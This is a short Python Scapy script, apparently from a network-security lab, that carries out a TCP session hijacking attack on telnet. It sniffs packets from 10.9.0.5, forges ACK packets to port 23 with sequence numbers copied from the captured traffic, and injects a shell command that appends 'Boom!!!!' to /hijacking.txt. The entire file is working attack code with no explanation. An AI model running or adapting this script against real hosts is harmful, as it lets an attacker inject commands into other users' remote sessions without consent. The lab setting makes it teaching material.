#!/usr/bin/env python3

from scapy.all import *

def spoof_pkt(pkt):
    ip = IP(
        src=pkt[IP].dst,
        dst=pkt[IP].src
    )
    tcp = TCP(
        sport=pkt[TCP].dport,
        dport=23,
        flags="A",
        seq=pkt[TCP].ack,
        ack=pkt[TCP].seq + 1
    )
    data = "echo \"Boom!!!!\" >> /hijacking.txt\n\0"
    pkt = ip / tcp / data
    ls(pkt)
    send(pkt, verbose=0)

def main():
    f = f"tcp and src host 10.9.0.5"
    pkt = sniff(
        iface="br-27b5f07b4373",
        filter=f,
        prn=spoof_pkt
    )

if __name__ == "__main__":
    main()